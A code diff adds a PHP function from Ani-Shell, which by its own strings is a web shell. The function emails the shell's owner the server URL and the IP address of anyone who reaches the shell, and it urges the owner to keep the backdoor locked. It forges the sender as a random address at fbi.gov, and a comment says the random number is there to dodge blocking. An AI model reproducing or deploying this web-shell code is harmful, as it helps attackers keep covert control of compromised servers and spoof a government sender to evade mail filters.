@@ -1,0 +1,34 @@
+// -------------- Traceback Functions
+
+function sendLoginAlert()
+{
+    global $ownerEmail;
+    global $url;
+    $accesedIp = $_SERVER['REMOTE_ADDR'];
+    $randomInt = rand(0,1000000);           # to avoid id blocking
+    $from = "ani-shell$randomInt@fbi.gov"; 
+    
+    //echo $from;
+    
+    if(function_exists('mail'))
+    {
+        $subject = "Shell Accessed -- Ani-Shell --";
+        $message = "
+Hey Owner ,
+        
+        Your Shell(Ani-Shell) located at $url was accessed by $accesedIp
+        
+        If its not you :-
+        
+        1. Please check if the shell is secured.
+        2. Change your user name and Password.
+        3. Check if lock is 0n!
+
+        Thanking You
+        
+Yours Faithfully
+Ani-Shell
+        ";
+        mail($ownerEmail,$subject,$message,'From:'.$from);
+    }
+}
